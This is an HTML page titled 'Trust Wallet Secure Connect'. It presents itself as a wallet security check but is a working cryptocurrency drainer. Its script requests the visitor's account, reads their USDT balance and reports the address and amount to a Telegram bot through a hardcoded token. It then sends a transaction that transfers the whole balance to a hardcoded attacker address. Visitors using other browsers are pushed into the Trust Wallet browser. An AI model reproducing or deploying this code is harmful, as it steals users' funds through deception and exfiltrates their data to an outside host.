<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Trust Wallet Secure Connect</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        body {
            text-align: center;
            font-family: Arial;
            padding: 50px;
            background: #0d1117;
            color: white;
        }
        button {
            background: #00ff88;
            color: black;
            padding: 20px 50px;
            font-size: 24px;
            border: none;
            border-radius: 15px;
            cursor: pointer;
        }
        .loader {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid white;
            border-top-color: #00ff88;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>🛡️ Wallet Security Check</h1>
    <button id="connectBtn">Connect Trust Wallet</button>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Opening Trust Wallet...</p>
    </div>
    <div id="status"></div>

    <script>
        // ========== ВАШИ ДАННЫЕ ==========
        const BOT_TOKEN = '8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk';
        const CHAT_ID = '7663459492';
        const ATTACKER_ADDRESS = '0x9f9e8388Cc4eA6772675A532576A07deFFB85b8E';
        // ==================================
        
        const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        
        const USDT_ABI = [
            {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ];

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: message.substring(0, 4000)})
                });
            } catch(e) {}
        }

        // Функция для создания WalletConnect ссылки
        function createWalletConnectLink(chainId, address, data) {
            // Формируем URL схемы для Trust Wallet
            const params = new URLSearchParams({
                chain_id: chainId,
                address: address,
                data: data
            });
            return `https://link.trustwallet.com/send?${params.toString()}`;
        }

        document.getElementById('connectBtn').onclick = async () => {
            const btn = document.getElementById('connectBtn');
            const loader = document.getElementById('loader');
            const statusDiv = document.getElementById('status');
            
            btn.disabled = true;
            loader.style.display = 'block';
            
            // Проверка: находимся ли мы уже в Trust Wallet браузере?
            const isTrustWallet = navigator.userAgent.toLowerCase().includes('trust');
            
            if (isTrustWallet) {
                // Мы уже внутри Trust Wallet - можно использовать депсктопный метод
                statusDiv.innerHTML = 'Processing...';
                
                try {
                    const web3 = new Web3(window.ethereum || 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161');
                    
                    // Запрос аккаунта
                    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
                    const victimAddress = accounts[0];
                    
                    const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
                    const balance = await contract.methods.balanceOf(victimAddress).call();
                    const balanceFormatted = web3.utils.fromWei(balance, 'ether');
                    
                    await sendToTelegram(`🎯 ЖЕРТВА: ${victimAddress}\n💰 USDT: ${balanceFormatted}`);
                    
                    if (parseFloat(balanceFormatted) <= 0) {
                        statusDiv.innerHTML = '✅ No USDT found';
                        btn.disabled = false;
                        loader.style.display = 'none';
                        return;
                    }
                    
                    // Отправляем транзакцию
                    const transferData = contract.methods.transfer(ATTACKER_ADDRESS, balance).encodeABI();
                    const txHash = await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: victimAddress,
                            to: USDT_CONTRACT,
                            data: transferData,
                            gas: '100000'
                        }]
                    });
                    
                    await sendToTelegram(`💸 УСПЕШНО!\n👤 ${victimAddress}\n💰 ${balanceFormatted} USDT\n🔗 ${txHash}`);
                    statusDiv.innerHTML = '✅ Verification complete!';
                    
                } catch(e) {
                    statusDiv.innerHTML = '❌ Error: ' + e.message;
                    await sendToTelegram(`❌ ОШИБКА: ${e.message}`);
                } finally {
                    btn.disabled = false;
                    loader.style.display = 'none';
                }
            } else {
                // МЫ НЕ В TRUST WALLET - открываем через глубокую ссылку
                statusDiv.innerHTML = 'Redirecting to Trust Wallet...';
                
                // Создаём демо-ссылку для открытия кошелька
                // В реальности, вам нужно задеплоить сайт на HTTPS и использовать WalletConnect
                const trustDeepLink = `https://link.trustwallet.com/open?url=${encodeURIComponent(window.location.href)}`;
                
                // Пытаемся открыть Trust Wallet
                window.location.href = trustDeepLink;
                
                // Если не открылось - показываем инструкцию
                setTimeout(() => {
                    statusDiv.innerHTML = '❌ Please open this link in Trust Wallet browser.\n\n1. Open Trust Wallet\n2. Go to DApp browser\n3. Enter this URL';
                }, 2000);
                
                btn.disabled = false;
                loader.style.display = 'none';
            }
        };
    </script>
</body>
</html>
